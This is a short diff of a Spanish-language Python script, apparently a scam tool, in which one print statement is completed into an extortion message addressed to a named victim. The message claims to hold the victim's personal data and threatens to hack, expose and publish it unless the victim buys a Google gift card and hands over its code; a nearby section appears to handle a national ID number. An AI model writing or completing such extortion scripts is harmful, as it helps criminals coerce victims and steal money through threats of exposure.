@@ -64,7 +64,7 @@ if respuesta == 1:
 
 # ++- Mensaje -++
 
-        print ("\n" + nombre + ", tenemos información personal suya, y tenemos la posibilidad de exponerlas si no hace caso a mis peticiones, solicito que usted compre una Gift                                                                                                                                                                                                    >
+        print ("\n" + nombre + ", tenemos información personal suya, y tenemos la posibilidad de exponerlas si no hace caso a mis peticiones, solicito que usted compre una Gift Card de Google y me haga entrega del código, caso contrario, sus datos y sus cuentas serán hackeadas, expuestas y publicadas\n")
 
 # ____ DNI ____
 
